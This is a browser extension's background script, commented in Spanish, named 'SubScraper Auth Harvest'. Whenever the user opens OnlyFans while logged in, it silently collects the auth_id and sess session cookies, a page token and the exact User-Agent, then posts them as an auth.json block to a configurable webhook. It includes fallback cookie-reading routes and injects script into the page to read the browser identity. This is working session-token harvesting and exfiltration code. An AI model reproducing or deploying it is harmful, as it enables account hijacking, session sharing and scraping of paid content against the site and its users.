// SubScraper Auth Harvest — background (service worker MV3).
//
// Receta identica a la cosecha de escritorio/Android de SubScraper:
//   USER_ID    = cookie auth_id
//   COOKIE     = "auth_id=<id>; sess=<sess>;"
//   X_BC       = localStorage 'bcTokenSha' (lo manda el content script)
//   USER_AGENT = navigator.userAgent de la pagina
// y el mensaje es el de las apps: "auth.json actualizado:"
// + el JSON indentado en un bloque ```json, con los campos en el
// mismo orden que escribe el AuthService de escritorio
// (USER_ID, USER_AGENT, X_BC, COOKIE).
//
// Disparo (pedido del usuario): cada vez que ENTRA a OnlyFans con la
// sesion iniciada (el content script avisa al cargar la pagina), sin
// botones. Para no inundar el canal navegando, se postea UNA vez por
// valor de sess dentro de la sesion del navegador; si la sess cambia
// (login nuevo), se postea de nuevo. El popup puede forzar un envio.
//
// Diagnostico: en chrome.storage.local queda el ultimo evento con
// SOLO presencias (booleanos) y el codigo HTTP — jamas valores de
// sesion ni la URL del webhook.

"use strict";

var WEBHOOK_URL = "__WEBHOOK_URL__";
var SITE_DOMAIN = "onlyfans.com";

// Fallback en memoria si storage.session no existe en este navegador.
var memPostedSess = null;

// Reserva en vuelo (auditoria): entre el chequeo de dedup y la
// marca tras el 2xx hay segundos de red; dos 'page-ready' casi
// simultaneos (dos pestanas, una doble carga) pasarian ambos el
// chequeo y postearian la misma sess dos veces. La reserva es
// sincrona en memoria, la consulta el mismo chequeo, y se libera si
// el posteo no prospera (un 2xx la convierte en marca persistida).
var memInFlightSess = null;

// User-Agent REAL que el navegador presenta al sitio, observado
// pasivamente de las cabeceras de los propios pedidos de la pagina
// (webRequest). Es la fuente de verdad: en Orion el content script
// da navigator.userAgent vacio y el background se identifica como
// Firefox, pero el sitio ve Safari — y el auth tiene que llevar el
// UA que el sitio conoce, o la app lo rechaza y el sitio expulsa la
// sesion (aprendido el 2026-10-26 con la sesion compartida).
var lastSiteUa = "";

function noteSiteUa(value) {
  if (!value || value === lastSiteUa) {
    return;
  }
  lastSiteUa = value;
  try {
    if (chrome.storage && chrome.storage.session) {
      chrome.storage.session.set({ siteUa: value });
    }
  } catch (e) {
    // queda en memoria
  }
}

if (
  typeof chrome !== "undefined" &&
  chrome.webRequest &&
  chrome.webRequest.onBeforeSendHeaders
) {
  var wrListener = function (details) {
    if (details.tabId == null || details.tabId < 0) {
      return;
    }
    var headers = details.requestHeaders || [];
    for (var i = 0; i < headers.length; i++) {
      var hn = (headers[i].name || "").toLowerCase();
      if (hn === "user-agent" && headers[i].value) {
        noteSiteUa(headers[i].value);
        break;
      }
    }
  };
  var wrFilter = { urls: ["https://" + SITE_DOMAIN + "/*"] };
  try {
    chrome.webRequest.onBeforeSendHeaders.addListener(wrListener, wrFilter, [
      "requestHeaders",
      "extraHeaders",
    ]);
  } catch (e) {
    try {
      chrome.webRequest.onBeforeSendHeaders.addListener(wrListener, wrFilter, [
        "requestHeaders",
      ]);
    } catch (e2) {
      // Este motor no deja observar: quedan las otras fuentes de UA.
    }
  }
}

function nowIso() {
  return new Date().toISOString();
}

async function recordDiag(patch) {
  try {
    var prev = (await chrome.storage.local.get("diag")).diag || {};
    var next = Object.assign({}, prev, patch, { at: nowIso() });
    await chrome.storage.local.set({ diag: next });
    return next;
  } catch (e) {
    return patch;
  }
}

async function getPostedSess() {
  try {
    if (chrome.storage && chrome.storage.session) {
      var got = await chrome.storage.session.get("lastPostedSess");
      if (got.lastPostedSess) {
        return got.lastPostedSess;
      }
    }
  } catch (e) {
    // cae a los fallbacks en memoria
  }
  return memPostedSess || memInFlightSess;
}

async function setPostedSess(sess) {
  memPostedSess = sess;
  try {
    if (chrome.storage && chrome.storage.session) {
      await chrome.storage.session.set({ lastPostedSess: sess });
    }
  } catch (e) {
    // el fallback en memoria ya quedo seteado
  }
}

function cookiesApiAvailable() {
  return !!(
    typeof chrome !== "undefined" &&
    chrome.cookies &&
    typeof chrome.cookies.getAll === "function"
  );
}

// Entre cookies homonimas (host-only, de dominio, de subdominios) se
// prefiere la del dominio raiz, que es la que usa el sitio.
function pickCookie(cookies, name) {
  var matches = cookies.filter(function (c) {
    return c.name === name;
  });
  if (!matches.length) {
    return "";
  }
  var rank = function (c) {
    if (c.domain === "." + SITE_DOMAIN) return 0;
    if (c.domain === SITE_DOMAIN) return 1;
    return 2;
  };
  matches.sort(function (a, b) {
    return rank(a) - rank(b);
  });
  return matches[0].value || "";
}

// Lectura de cookies tolerante al motor: no todos los navegadores
// resuelven igual el filtro {domain} de chrome.cookies.getAll
// (Orion devolvia vacio con la sesion iniciada y el permiso en
// Allow). Se prueban varias formas de consulta y se fusionan los
// resultados; el rastro por via (conteos, nunca valores) queda en
// el diagnostico cuando faltan las cookies.
async function readSessionCookies() {
  var byKey = new Map();
  var shapes = { url: 0, domain: 0, all: 0, get: 0 };
  var addAll = function (list, shape) {
    if (!Array.isArray(list)) {
      return;
    }
    list.forEach(function (c) {
      if (!c || !c.name) {
        return;
      }
      var dom = String(c.domain || "").replace(/^\./, "");
      if (dom !== SITE_DOMAIN && !dom.endsWith("." + SITE_DOMAIN)) {
        return;
      }
      var key = c.name + "|" + (c.domain || "") + "|" + (c.path || "");
      if (!byKey.has(key)) {
        shapes[shape]++;
      }
      byKey.set(key, c);
    });
  };
  var have = function () {
    var names = {};
    byKey.forEach(function (c) {
      names[c.name] = true;
    });
    return names;
  };
  var queries = [
    ["url", { url: "https://" + SITE_DOMAIN + "/" }],
    ["domain", { domain: SITE_DOMAIN }],
    ["all", {}],
  ];
  for (var i = 0; i < queries.length; i++) {
    var n = have();
    if (n.auth_id && n.sess) {
      break;
    }
    try {
      addAll(await chrome.cookies.getAll(queries[i][1]), queries[i][0]);
    } catch (e) {
      // Via fallida en este motor: se sigue con la proxima.
    }
  }
  var missing = ["auth_id", "sess"].filter(function (nm) {
    return !have()[nm];
  });
  for (var j = 0; j < missing.length; j++) {
    try {
      var one = await chrome.cookies.get({
        url: "https://" + SITE_DOMAIN + "/",
        name: missing[j],
      });
      if (one) {
        addAll([one], "get");
      }
    } catch (e) {
      // Sin esta via en este motor.
    }
  }
  var all = Array.from(byKey.values());
  return {
    userId: pickCookie(all, "auth_id"),
    sess: pickCookie(all, "sess"),
    shapes:
      "url=" + shapes.url +
      ",domain=" + shapes.domain +
      ",all=" + shapes.all +
      ",get=" + shapes.get,
  };
}

async function postToDestination(auth) {
  var pretty = JSON.stringify(auth, null, 2);
  var content = "auth.json actualizado:\n```json\n" + pretty + "\n```";
  var resp = await fetch(WEBHOOK_URL, {
    method: "POST",
    headers: { "Content-Type": "application/json" },
    body: JSON.stringify({ content: content }),
  });
  return resp.status;
}

// UA desde el MUNDO PRINCIPAL de la pagina (scripting MAIN): ahi
// navigator.userAgent es el que el sitio ve — la pagina lo lee de
// ese mundo (whatismybrowser lo demuestra). La inyeccion por API
// no depende del CSP de la pagina. Es la via que queda cuando el
// content script da "" y webRequest no entrega (Orion, v1.0.3).
async function uaFromMainWorld(tabId) {
  if (
    tabId == null ||
    !(typeof chrome !== "undefined" && chrome.scripting && chrome.scripting.executeScript)
  ) {
    return "";
  }
  try {
    var res = await chrome.scripting.executeScript({
      target: { tabId: tabId },
      world: "MAIN",
      func: function () {
        return navigator.userAgent || "";
      },
    });
    if (res && res[0] && typeof res[0].result === "string") {
      return res[0].result;
    }
  } catch (e) {
    // Motor sin scripting MAIN: quedan las demas vias.
  }
  return "";
}

// Nucleo de la cosecha. Devuelve un resumen de presencias/estado
// (sin valores) que tambien queda como diagnostico.
async function harvest(xBc, ua, force, tabId, uaXray) {
  if (!cookiesApiAvailable()) {
    return recordDiag({
      kind: "cookies-api-missing",
      authId: false,
      sess: false,
      token: !!xBc,
      posted: false,
    });
  }

  var cookies;
  try {
    cookies = await readSessionCookies();
  } catch (e) {
    return recordDiag({
      kind: "cookies-error",
      error: (e && e.name) || "Error",
      posted: false,
    });
  }

  var presence = {
    authId: !!cookies.userId,
    sess: !!cookies.sess,
    token: !!xBc,
  };

  if (!presence.authId || !presence.sess) {
    return recordDiag(Object.assign({}, presence, {
      kind: "sin-sesion",
      shapes: cookies.shapes,
      posted: false,
    }));
  }

  if (!presence.token) {
    return recordDiag(Object.assign({}, presence, {
      kind: "sin-token",
      posted: false,
    }));
  }

  if (!force && (await getPostedSess()) === cookies.sess) {
    return recordDiag(Object.assign({}, presence, {
      kind: "ya-posteado-esta-sesion",
      posted: false,
    }));
  }

  if (!force) {
    memInFlightSess = cookies.sess;
  }

  // User-Agent por orden de fidelidad al que el sitio conoce:
  // 1) el observado en los pedidos reales de la pagina (webRequest);
  // 2) el que manda el content script (navigator de la pagina —
  //    en Chrome/Edge/Firefox es el verdadero; en Orion viene "");
  // 3) el del propio background (ultimo recurso: en Orion es una
  //    identidad Firefox que el sitio NO ve — con esa etiqueta la
  //    app rechaza el auth; confirmado el 2026-10-26).
  var uaFinal = "";
  var uaSource = "none";
  // Piso garantizado: el UA que el usuario cargo a mano en el popup
  // para ESTE navegador (storage.local 'uaOverride'). En Orion todas
  // las vias automaticas devuelven la identidad sintetica Firefox
  // del entorno de extensiones — la pagina real ve otra (Safari) y
  // solo el usuario puede declararla. Si esta cargado, gana siempre.
  var uaOverride = "";
  try {
    var ov = await chrome.storage.local.get("uaOverride");
    if (typeof ov.uaOverride === "string" && ov.uaOverride) {
      uaOverride = ov.uaOverride;
    }
  } catch (e) {
    // sin storage local: quedan las vias automaticas
  }
  if (uaOverride) {
    uaFinal = uaOverride;
    uaSource = "override";
  }
  if (!uaFinal && !lastSiteUa) {
    try {
      if (chrome.storage && chrome.storage.session) {
        var savedUa = await chrome.storage.session.get("siteUa");
        if (savedUa.siteUa) {
          lastSiteUa = savedUa.siteUa;
        }
      }
    } catch (e) {
      // sin storage de sesion: queda la memoria
    }
  }
  if (!uaFinal && lastSiteUa) {
    uaFinal = lastSiteUa;
    uaSource = "observed";
  }
  if (!uaFinal) {
    var mwUa = await uaFromMainWorld(tabId);
    if (mwUa) {
      uaFinal = mwUa;
      uaSource = "mainworld";
    } else if (uaXray) {
      uaFinal = uaXray;
      uaSource = "xray";
    } else if (ua) {
      uaFinal = ua;
      uaSource = "page";
    } else if (typeof navigator !== "undefined" && navigator.userAgent) {
      uaFinal = navigator.userAgent;
      uaSource = "background";
    }
  }

  // Orden de campos y formato: identicos al auth-feather.json que
  // escriben las apps (Newtonsoft, Formatting.Indented).
  var auth = {
    USER_ID: cookies.userId,
    USER_AGENT: uaFinal,
    X_BC: xBc,
    COOKIE: "auth_id=" + cookies.userId + "; sess=" + cookies.sess + ";",
  };

  try {
    var status = await postToDestination(auth);
    var ok = status >= 200 && status < 300;
    if (ok) {
      await setPostedSess(cookies.sess);
    }
    memInFlightSess = null;
    return recordDiag(Object.assign({}, presence, {
      kind: ok ? "posteado" : "rechazado",
      httpStatus: status,
      uaSource: uaSource,
      posted: ok,
    }));
  } catch (e) {
    memInFlightSess = null;
    return recordDiag(Object.assign({}, presence, {
      kind: "error-red",
      error: (e && e.name) || "Error",
      posted: false,
    }));
  }
}

chrome.runtime.onMessage.addListener(function (msg, sender, sendResponse) {
  if (!msg || !msg.type) {
    return false;
  }

  if (msg.type === "page-ready") {
    var senderTabId = sender && sender.tab ? sender.tab.id : null;
    harvest(msg.xBc || "", msg.ua || "", false, senderTabId, msg.uaXray || "");
    return false;
  }

  if (msg.type === "force" || msg.type === "diagnose") {
    (async function () {
      var base = {
        cookiesApi: cookiesApiAvailable(),
        webhookConfigured: WEBHOOK_URL.indexOf("http") === 0,
      };
      // Piezas de la pagina (token + UA) via el content script:
      // primero la pestana activa; si ahi no hay token (el popup
      // puede abrirse sobre otra pestana, o el navegador no modela
      // «ventana»), cualquier pestana del sitio sirve (la consulta
      // por URL la habilita el host_permissions, sin permiso tabs).
      var probe = { xBc: "", ua: "", uaXray: "" };
      var probeTabId = null;
      var probeIn = async function (tabs) {
        if (!tabs) {
          return;
        }
        for (var i = 0; i < tabs.length; i++) {
          if (tabs[i].id == null) {
            continue;
          }
          try {
            var r = await chrome.tabs.sendMessage(tabs[i].id, { type: "probe" });
            if (r && r.xBc) {
              probe = r;
              probeTabId = tabs[i].id;
              return;
            }
            if (r && !probe.ua) {
              probe = r;
            }
          } catch (e) {
            // Esa pestana no tiene content script: se sigue.
          }
        }
      };
      try {
        await probeIn(await chrome.tabs.query({ active: true, currentWindow: true }));
        if (!probe.xBc) {
          await probeIn(await chrome.tabs.query({ url: "https://" + SITE_DOMAIN + "/*" }));
        }
      } catch (e) {
        // Sin API de pestanas en este navegador: el probe queda vacio
        // y el diagnostico lo refleja; el camino automatico no usa
        // pestanas en ningun punto.
      }
      base.token = !!probe.xBc;

      if (msg.type === "diagnose") {
        if (base.cookiesApi) {
          try {
            var c = await readSessionCookies();
            base.authId = !!c.userId;
            base.sess = !!c.sess;
          } catch (e) {
            base.authId = false;
            base.sess = false;
          }
        }
        var last = (await chrome.storage.local.get("diag")).diag || null;
        sendResponse({ diag: base, last: last });
        return;
      }

      // force: cosecha y postea aunque la sess ya se haya posteado.
      var result = await harvest(probe.xBc || "", probe.ua || "", true, probeTabId, probe.uaXray || "");
      sendResponse({ diag: base, last: result });
    })();
    return true; // respuesta asincronica
  }

  return false;
});
